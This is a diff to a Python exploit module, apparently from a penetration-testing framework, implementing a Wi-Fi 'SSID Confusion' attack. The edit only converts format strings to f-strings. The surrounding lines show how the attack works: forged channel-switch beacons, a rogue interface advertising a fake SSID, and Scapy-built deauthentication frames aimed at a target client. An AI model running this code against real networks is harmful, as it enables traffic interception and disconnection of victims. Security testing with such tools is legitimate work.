@@ -201,8 +201,7 @@ class Exploit(Exploit):
             self.target_bssid, self.target_ssid,
             self.rogue_channel, self.csa_count,
         )
-        print_status("Injecting {} CSA bursts on channel {}...".format(
-            self.csa_bursts, self.real_channel))
+        print_status(f"Injecting {self.csa_bursts} CSA bursts on channel {self.real_channel}...")
 
         for i in range(self.csa_bursts):
             if self._stop.is_set():
@@ -271,22 +270,20 @@ class Exploit(Exploit):
 
         if self.dry_run:
             print_info("SSID Confusion Attack Configuration:")
-            print_info("  Real iface:   {} (ch {})".format(self.iface_real, self.real_channel))
-            print_info("  Rogue iface:  {} (ch {})".format(self.iface_rogue, self.rogue_channel))
-            print_info("  Target BSSID: {}".format(self.target_bssid))
-            print_info("  Real SSID:    '{}'".format(self.target_ssid))
-            print_info("  Fake SSID:    '{}'".format(self.fake_ssid))
-            print_info("  CSA bursts:   {}".format(self.csa_bursts))
+            print_info(f"  Real iface:   {self.iface_real} (ch {self.real_channel})")
+            print_info(f"  Rogue iface:  {self.iface_rogue} (ch {self.rogue_channel})")
+            print_info(f"  Target BSSID: {self.target_bssid}")
+            print_info(f"  Real SSID:    '{self.target_ssid}'")
+            print_info(f"  Fake SSID:    '{self.fake_ssid}'")
+            print_info(f"  CSA bursts:   {self.csa_bursts}")
             return
 
         if os.getuid() != 0:
             print_error("Root privileges required.")
             return
 
-        print_status("SSID Confusion: '{}' -> '{}'".format(
-            self.target_ssid, self.fake_ssid))
-        print_info("Real channel: {} | Rogue channel: {}".format(
-            self.real_channel, self.rogue_channel))
+        print_status(f"SSID Confusion: '{self.target_ssid}' -> '{self.fake_ssid}'")
+        print_info(f"Real channel: {self.real_channel} | Rogue channel: {self.rogue_channel}")
 
         print_status("Phase 1: Injecting CSA beacons to force channel switch...")
         csa_thread = threading.Thread(target=self._inject_csa, daemon=True)
@@ -294,7 +291,7 @@ class Exploit(Exploit):
         csa_thread.join()
 
         if self.deauth_client:
-            print_status("Sending deauth to {}...".format(self.deauth_client))
+            print_status(f"Sending deauth to {self.deauth_client}...")
             deauth = (
                 RadioTap()
                 / Dot11(type=0, subtype=12,
